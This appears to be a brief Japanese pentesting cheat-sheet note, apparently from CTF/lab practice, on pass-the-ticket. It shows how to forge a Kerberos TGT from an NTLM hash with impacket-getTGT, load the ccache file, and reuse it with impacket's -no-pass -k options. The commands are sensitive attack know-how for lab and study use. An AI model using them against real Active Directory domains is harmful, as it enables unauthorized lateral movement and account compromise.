# Pass The Hashがいけそでいけねー場合はPass The Ticketを狙うべし

Kerberosチケットでの認証は許可されていて、NTLMでの認証は許可されていないかも。

**impacket-getTGT** でハッシュからTGTを作成。

```
impacket-getTGT -hashes <NTLM hash> -dc-ip <IP> <domain>/<username>
```

その後、チケットがつくれてuser.ccacheに保存されたら、以下のようにチケットを登録する：

```
cp user.ccache /tmp/krb5cc_0
export KRB5CCNAME=/tmp/krb5cc_0
```

チケットができたら、今までpass the hashでやっていたimpacketを、このチケットをつかって行えばよい（オプション **-no-pass -k**）。

Aptではbruteforceした：

![gettgtbrute](https://user-images.githubusercontent.com/85237728/159113359-050c0e98-259d-406a-aff3-7230cc59e61a.png)

c.f. https://www.thehacker.recipes/ad/movement/kerberos/ptk

![gotticket](https://user-images.githubusercontent.com/85237728/159119239-5d4bf0fc-c1ed-4e54-9b3c-d47a97ff4ae1.png)

![klist](https://user-images.githubusercontent.com/85237728/159119325-89e415d6-1ce0-4296-930a-093bd0adb96d.png)
